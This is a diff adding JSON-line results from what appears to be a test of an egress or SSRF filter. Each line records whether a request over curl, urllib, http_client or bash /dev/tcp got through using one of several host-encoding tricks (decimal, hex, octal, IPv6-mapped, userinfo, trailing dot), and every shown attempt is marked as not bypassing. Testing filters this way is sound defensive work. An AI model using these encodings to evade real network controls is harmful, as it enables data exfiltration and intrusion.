+{"baseline": "B6", "bypass": false, "channel": "urllib", "code": null, "form": "upper"}
+{"baseline": "B6", "bypass": false, "channel": "http_client", "code": null, "form": "upper"}
+{"baseline": "B6", "bypass": false, "channel": "http_client", "code": null, "form": "name"}
+{"baseline": "B6", "bypass": false, "channel": "http_client", "code": null, "form": "ip"}
+{"baseline": "B6", "bypass": false, "channel": "http_client", "code": null, "form": "decimal"}
+{"baseline": "B6", "bypass": false, "channel": "http_client", "code": null, "form": "hex"}
+{"baseline": "B6", "bypass": false, "channel": "http_client", "code": null, "form": "octal"}
+{"baseline": "B6", "bypass": false, "channel": "http_client", "code": null, "form": "short"}
+{"baseline": "B6", "bypass": false, "channel": "http_client", "code": null, "form": "mapped6"}
+{"baseline": "B6", "bypass": false, "channel": "http_client", "code": null, "form": "userinfo"}
+{"baseline": "B6", "bypass": false, "channel": "http_client", "code": null, "form": "trailing_dot"}
+{"baseline": "B6", "bypass": false, "channel": "curl", "code": null, "form": "trailing_dot"}
+{"baseline": "B6", "bypass": false, "channel": "curl", "code": null, "form": "name"}
+{"baseline": "B6", "bypass": false, "channel": "curl", "code": null, "form": "ip"}
+{"baseline": "B6", "bypass": false, "channel": "curl", "code": null, "form": "decimal"}
+{"baseline": "B6", "bypass": false, "channel": "curl", "code": null, "form": "hex"}
+{"baseline": "B6", "bypass": false, "channel": "curl", "code": null, "form": "octal"}
+{"baseline": "B6", "bypass": false, "channel": "curl", "code": null, "form": "short"}
+{"baseline": "B6", "bypass": false, "channel": "curl", "code": null, "form": "mapped6"}
+{"baseline": "B6", "bypass": false, "channel": "curl", "code": null, "form": "userinfo"}
+{"baseline": "B6", "bypass": false, "channel": "curl", "code": null, "form": "upper"}
+{"baseline": "B6", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "upper"}
+{"baseline": "B6", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "name"}
+{"baseline": "B6", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "ip"}
+{"baseline": "B6", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "decimal"}
+{"baseline": "B6", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "hex"}
+{"baseline": "B6", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "octal"}
+{"baseline": "B6", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "short"}
+{"baseline": "B6", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "mapped6"}
+{"baseline": "B6", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "userinfo"}
+{"baseline": "B6", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "trailing_dot"}
